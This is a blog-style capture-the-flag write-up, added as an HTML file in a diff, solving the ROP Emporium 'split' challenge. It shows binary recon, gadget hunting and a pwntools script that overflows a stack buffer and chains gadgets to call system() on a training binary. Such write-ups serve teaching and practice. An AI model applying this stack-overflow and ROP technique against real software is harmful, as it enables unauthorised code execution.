@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Building a ROP chain to call system() with a custom string argument">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ROP Emporium: split">
+<meta property="og:url" content="https://rivers.sh/posts/ropemporium-split/index.html">
+<meta property="og:site_name" content="River">
+<meta property="og:description" content="Building a ROP chain to call system() with a custom string argument">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-01-27T05:00:00.000Z">
+<meta property="article:modified_time" content="2026-01-28T20:06:45.445Z">
+<meta property="article:author" content="River">
+<meta property="article:tag" content="Binary Exploitation">
+<meta property="article:tag" content="x86-64">
+<meta property="article:tag" content="pwntools">
+<meta property="article:tag" content="ROP">
+<meta property="article:tag" content="ROPgadget">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ROP Emporium: split</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+    <!-- mathjax -->
+    
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="River" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archive</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/ropemporium-ret2win/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rivers.sh/posts/ropemporium-split/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rivers.sh/posts/ropemporium-split/&text=ROP Emporium: split"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rivers.sh/posts/ropemporium-split/&title=ROP Emporium: split"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rivers.sh/posts/ropemporium-split/&is_video=false&description=ROP Emporium: split"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ROP Emporium: split&body=Check out this article: https://rivers.sh/posts/ropemporium-split/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rivers.sh/posts/ropemporium-split/&title=ROP Emporium: split"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rivers.sh/posts/ropemporium-split/&title=ROP Emporium: split"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rivers.sh/posts/ropemporium-split/&title=ROP Emporium: split"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rivers.sh/posts/ropemporium-split/&title=ROP Emporium: split"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rivers.sh/posts/ropemporium-split/&name=ROP Emporium: split&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rivers.sh/posts/ropemporium-split/&t=ROP Emporium: split"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Info"><span class="toc-number">1.</span> <span class="toc-text">Challenge Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">2.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gathering-Intel"><span class="toc-number">3.</span> <span class="toc-text">Gathering Intel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-ROP-Strategy"><span class="toc-number">4.</span> <span class="toc-text">The ROP Strategy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability"><span class="toc-number">5.</span> <span class="toc-text">Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Building-the-ROP-Chain"><span class="toc-number">6.</span> <span class="toc-text">Building the ROP Chain</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">7.</span> <span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Key-Takeaways"><span class="toc-number">8.</span> <span class="toc-text">Key Takeaways</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ROP Emporium: split
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">River</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-01-27T05:00:00.000Z" class="dt-published" itemprop="datePublished">2026-01-27</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/ROP-Emporium/">ROP Emporium</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Binary-Exploitation/" rel="tag">Binary Exploitation</a>, <a class="p-category" href="/tags/ROP/" rel="tag">ROP</a>, <a class="p-category" href="/tags/ROPgadget/" rel="tag">ROPgadget</a>, <a class="p-category" href="/tags/pwntools/" rel="tag">pwntools</a>, <a class="p-category" href="/tags/x86-64/" rel="tag">x86-64</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+  <!-- Display the description -->
+  <div class="post-description">Building a ROP chain to call system() with a custom string argument</div>
+
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>Use ROP (Return-Oriented Programming) to call <code>system(&quot;/bin/cat flag.txt&quot;)</code> by chaining gadgets together.</p>
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file <span class="built_in">split</span></span><br><span class="line"><span class="built_in">split</span>: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">File:     <span class="built_in">split</span></span><br><span class="line">Arch:     amd64</span><br><span class="line">RELRO:      Partial RELRO</span><br><span class="line">Stack:      No canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        No PIE (0x400000)</span><br><span class="line">Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>Same protections as ret2win - no canary, no PIE, but NX is enabled so we need ROP instead of shellcode.</p>
+<h2 id="Gathering-Intel"><a href="#Gathering-Intel" class="headerlink" title="Gathering Intel"></a>Gathering Intel</h2><p>First, let’s see what useful strings exist:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ strings <span class="built_in">split</span> | grep <span class="string">&quot;flag&quot;</span></span><br><span class="line">/bin/cat flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>The command we need is in the binary. Now let’s find available functions:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info functions</span><br><span class="line">0x0000000000400560  system@plt</span><br><span class="line">0x00000000004006e8  pwnme</span><br><span class="line">0x0000000000400742  usefulFunction</span><br></pre></td></tr></table></figure>
+
+<p><code>system@plt</code> is available, and there’s a <code>usefulFunction</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass usefulFunction</span><br><span class="line">Dump of assembler code for function usefulFunction:</span><br><span class="line">   0x0000000000400742 &lt;+0&gt;:     push   rbp</span><br><span class="line">   0x0000000000400743 &lt;+1&gt;:     mov    rbp,rsp</span><br><span class="line">   0x0000000000400746 &lt;+4&gt;:     mov    edi,0x40084a</span><br><span class="line">   0x000000000040074b &lt;+9&gt;:     call   0x400560 &lt;system@plt&gt;</span><br><span class="line">   0x0000000000400750 &lt;+14&gt;:    nop</span><br><span class="line">   0x0000000000400751 &lt;+15&gt;:    pop    rbp</span><br><span class="line">   0x0000000000400752 &lt;+16&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p>This calls <code>system()</code> but with the wrong argument:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/s 0x40084a</span><br><span class="line">0x40084a:       &quot;/bin/ls&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Not useful - we need <code>/bin/cat flag.txt</code>. Let’s find its address:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -s <span class="built_in">split</span> | grep <span class="string">&quot;cat flag&quot;</span></span><br><span class="line"> 601060 2f62696e 2f636174 20666c61 672e7478 /bin/cat flag.tx</span><br></pre></td></tr></table></figure>
+
+<p>String address: <code>0x601060</code></p>
+<h2 id="The-ROP-Strategy"><a href="#The-ROP-Strategy" class="headerlink" title="The ROP Strategy"></a>The ROP Strategy</h2><p>In x86-64, the first function argument goes in the <code>rdi</code> register. We need to:</p>
+<ol>
+<li>Load <code>0x601060</code> (our string) into <code>rdi</code></li>
+<li>Call <code>system()</code></li>
+</ol>
+<p>We need a <code>pop rdi; ret</code> gadget:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary <span class="built_in">split</span> --only <span class="string">&quot;pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004007c3 : pop rdi ; ret</span><br><span class="line">0x000000000040053e : ret</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p><code>0x4007c3</code> - exactly what we need.</p>
+<h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>Same pattern as ret2win, <code>pwnme</code> allocates 32 bytes but reads 96 bytes (<code>0x60</code>):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004006ec &lt;+4&gt;:     sub    rsp,0x20      ; 32 bytes allocated</span><br><span class="line">...</span><br><span class="line">0x0000000000400723 &lt;+59&gt;:    mov    edx,0x60      ; reading 96 bytes!</span><br></pre></td></tr></table></figure>
+
+<p>Offset to return address: 40 bytes (32 buffer + 8 saved RBP)</p>
+<h2 id="Building-the-ROP-Chain"><a href="#Building-the-ROP-Chain" class="headerlink" title="Building the ROP Chain"></a>Building the ROP Chain</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Stack after overflow:</span><br><span class="line">+------------------+</span><br><span class="line">| &#x27;A&#x27; * 40         |  &lt;- padding</span><br><span class="line">+------------------+</span><br><span class="line">| pop rdi; ret     |  &lt;- gadget address</span><br><span class="line">+------------------+</span><br><span class="line">| 0x601060         |  &lt;- gets popped into rdi</span><br><span class="line">+------------------+</span><br><span class="line">| system@plt       |  &lt;- execute system(rdi)</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure>
+
+<p>Flow:</p>
+<ol>
+<li><code>ret</code> pops <code>0x4007c3</code> into RIP</li>
+<li><code>pop rdi</code> pops <code>0x601060</code> into RDI</li>
+<li><code>ret</code> pops <code>0x40074b</code> into RIP</li>
+<li><code>system(&quot;/bin/cat flag.txt&quot;)</code> executes</li>
+</ol>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># addresses</span></span><br><span class="line">pop_rdi_ret = p64(<span class="number">0x4007c3</span>)</span><br><span class="line">cat_flag = p64(<span class="number">0x601060</span>)</span><br><span class="line">system_call = p64(<span class="number">0x40074b</span>)  <span class="comment"># use call system in usefulFunction</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span></span><br><span class="line">payload += pop_rdi_ret</span><br><span class="line">payload += cat_flag</span><br><span class="line">payload += system_call</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>Note: We use <code>0x40074b</code> (the <code>call system</code> inside <code>usefulFunction</code>) rather than <code>system@plt</code> directly to avoid stack alignment issues that can occur with modern libc.</p>
+<h2 id="Key-Takeaways"><a href="#Key-Takeaways" class="headerlink" title="Key Takeaways"></a>Key Takeaways</h2><ul>
+<li><strong>ROP chains</strong> let us execute arbitrary code even with NX enabled</li>
+<li><strong>x64 calling convention</strong>: first arg in <code>rdi</code>, second in <code>rsi</code>, etc.</li>
+<li><strong>Gadget hunting</strong>: tools like ROPgadget find useful instruction sequences</li>
+<li><strong>Stack alignment</strong>: sometimes you need to be careful about 16-byte alignment when calling libc functions</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Archive</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Info"><span class="toc-number">1.</span> <span class="toc-text">Challenge Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">2.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gathering-Intel"><span class="toc-number">3.</span> <span class="toc-text">Gathering Intel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-ROP-Strategy"><span class="toc-number">4.</span> <span class="toc-text">The ROP Strategy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability"><span class="toc-number">5.</span> <span class="toc-text">Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Building-the-ROP-Chain"><span class="toc-number">6.</span> <span class="toc-text">Building the ROP Chain</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">7.</span> <span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Key-Takeaways"><span class="toc-number">8.</span> <span class="toc-text">Key Takeaways</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rivers.sh/posts/ropemporium-split/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rivers.sh/posts/ropemporium-split/&text=ROP Emporium: split"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rivers.sh/posts/ropemporium-split/&title=ROP Emporium: split"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rivers.sh/posts/ropemporium-split/&is_video=false&description=ROP Emporium: split"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ROP Emporium: split&body=Check out this article: https://rivers.sh/posts/ropemporium-split/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rivers.sh/posts/ropemporium-split/&title=ROP Emporium: split"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rivers.sh/posts/ropemporium-split/&title=ROP Emporium: split"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rivers.sh/posts/ropemporium-split/&title=ROP Emporium: split"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rivers.sh/posts/ropemporium-split/&title=ROP Emporium: split"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rivers.sh/posts/ropemporium-split/&name=ROP Emporium: split&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rivers.sh/posts/ropemporium-split/&t=ROP Emporium: split"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    River
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archive</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+    <script src="/js/oneko.js"></script>
+    <script>
+      window.onload = function() {
+        oneko('/images/oneko.gif');
+      };
+    </script>
+</body>
+</html>
